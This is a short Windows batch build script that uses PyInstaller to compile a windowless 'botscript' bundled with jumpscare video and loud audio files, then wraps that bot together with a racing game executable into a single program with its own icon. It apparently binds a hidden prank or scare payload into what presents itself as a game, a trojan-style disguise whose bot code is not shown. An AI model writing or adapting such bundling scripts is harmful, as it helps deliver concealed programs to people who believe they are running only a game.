@echo off
setlocal

rem Set the paths relative to the batch file location
set "PYINSTALLER_PATH=..\..\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller"
set "DATA_PATH=."

rem Command to create the first executable
"%PYINSTALLER_PATH%" --onefile --add-data "%DATA_PATH%\666.mp3;." --add-data "%DATA_PATH%\5.mp3;." --add-data "%DATA_PATH%\filer.txt;." --add-data "%DATA_PATH%\play.mp3;." --add-data "%DATA_PATH%\jumpscare.mp4;." --add-data "%DATA_PATH%\loud.mp3;." --hidden-import=numpy "%DATA_PATH%\botscript.pyw"

rem Command to create the second executable
"%PYINSTALLER_PATH%" --onefile --add-data "%DATA_PATH%\CALL OF RACE_Data;CALL OF RACE_Data" --add-data "%DATA_PATH%\CALL OF RACE.exe;." --add-data "%DATA_PATH%\dist\botscript.exe;." --icon="%DATA_PATH%\icon.ico" "%DATA_PATH%\SPEEDY_MAQING_by_thug_hunter.pyw"

endlocal
